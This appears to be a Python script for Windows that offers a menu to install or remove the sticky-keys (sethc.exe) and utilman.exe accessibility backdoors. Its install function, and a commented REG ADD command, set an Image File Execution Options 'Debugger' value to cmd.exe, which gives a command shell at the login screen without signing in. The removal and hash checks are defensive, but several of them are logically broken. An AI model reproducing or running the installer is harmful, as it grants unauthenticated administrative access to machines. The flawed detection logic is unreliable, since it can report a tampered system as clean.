import sys
import os
import win32com.shell.shell as shell
import subprocess
import ctypes
import winreg
from hash import calculate_sha256, calculate_md5
from config import header, bar
import time

def remove_backdoor(path):
    print(bar)
    fileName = os.path.basename(path).strip(' ')
    print("Checking for " + fileName + " file replacement.")
    cmd = ("Get-ItemProperty " + path + " | select versioninfo | format-list")
    try:
        subprocess.call([powershellPath, cmd], stdout=open("out.txt", "w+"))
        f = open('out.txt', "r")
    except Exception as e:
        print(e)

    for line in f:
        if 'InternalName' in line or 'OriginalFilename' in line:
            print(line.strip('\n \t'))
            if fileName.strip('2.exe') not in line:
                print(fileName + "file has been replaced.")
                print("Please download a legitimate version from Microsoft.")

    print("Validating " + fileName + " hash against cmd.exe and explorer.exe hashes")
    sha256 = calculate_sha256(path)
    Md5 = calculate_md5(path)
    cmdSha = calculate_sha256(cmdPath)
    cmdMd5 = calculate_md5(cmdPath)
    explorerSha = calculate_sha256(explorerPath)
    explorerMd5 = calculate_md5(explorerPath)
    if sha256 == (cmdSha or explorerSha) or Md5 == (cmdMd5 or explorerMd5):
        print(fileName + " file has been replaced.")
        print(fileName + " Sha256:\n" + sha256)
        print("cmd.exe Sha256:\n" + cmdSha)
        print("explorer.exe Sha256:\n" + explorerSha)
        print(fileName + "MD5:\n" + Md5)
        print("cmd.exe MD5:\n" + cmdMd5)
        print("explorer.exe MD5:\n" + explorerMd5)
    else:
        print(fileName + " hashes do not match cmd.exe or explorer.exe.")

    print("Performing " + fileName + " registry analysis.")

    registryPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + fileName

    try:
        # TODO: You must remove all sub keys before removing the key
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
        # winreg.DeleteKey(key, fileName)
    except:
        print(fileName + " backdoor registry entry not found.")
        return

    # key was found, just use cmd
    print(fileName + " backdoor registry entry found, removing...")
    cmd = ('REG DELETE "HKLM\\' + registryPath + '" /f')
    os.system(cmd)

def install_backdoor(path):
    fileName = os.path.basename(path).strip(' ')

    print("Adding " + fileName + " backdoor to registry.")
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
    except Exception as e:
        print(e)
    try:
        winreg.SetValueEx(key, 'Debugger', 0, winreg.REG_SZ, cmdPath)
        # os.system('REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f')
    except Exception as e:
        print(e)

#TODO: elevate to admin access (compile as exe?), get rid of repeated code, research other backdoors, add powershell, implement config
if __name__ == "__main__":
    print(header)

    # get the current drive name
    drive = os.getenv("SystemDrive")
    sethcPath = (drive + "\windows\system32\sethc.exe ")
    sethcRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe')
    utilmanPath = (drive + "\windows\system32\\utilman.exe ")
    utilmanRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\utilman.exe')
    cmdPath = (drive + "\windows\system32\cmd.exe ")
    explorerPath = (drive + "\windows\explorer.exe ")
    powershellPath = (drive + "\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe")

    while True:
        print(bar)
        time.sleep(.5)
        print("Please select from the following options:")
        print("[I]nstall Backdoor.\n[R]emove Backdoor.\n[C]onfigure Settings.\n[E]xit the Program.")
        choice = input("[ ]").lower()
        # install backdoor
        if choice == 'i':
            print(bar)
            print("WARNING: THIS WILL ALLOW ANYONE ADMIN ACCESS TO THIS SYSTEM AT LOGIN SCREEN.")
            print("Which backdoor would you like to install?")
            print("[S]ticky Keys (sethc.exe).")
            print("[U]tility Manager (utilman.exe).")
            print("[B]oth.")
            print("[R]eturn to main menu.")
            print("[E]xit the Program.")
            choice = input("[ ]").lower()
            if choice == 's':
                install_backdoor(sethcRegistryPath)
            elif choice == 'u':
                install_backdoor(utilmanRegistryPath)
            elif choice == 'b':
                install_backdoor(sethcRegistryPath)
                install_backdoor(utilmanRegistryPath)
            elif choice == 'r':
                continue
            elif choice == 'e':
                print("Exiting...")
                exit(0)
        # remove backdoor
        if choice == 'r':
            remove_backdoor(sethcPath)
            remove_backdoor(utilmanPath)
        # TODO: implement configuration
        if choice == 'c':
            print("***Under Construction***\nPlease post any suggestions for configuration to www.github.com/gitgiant")
        # exit
        if choice == 'e':
            print("Exiting...")
            exit(0)
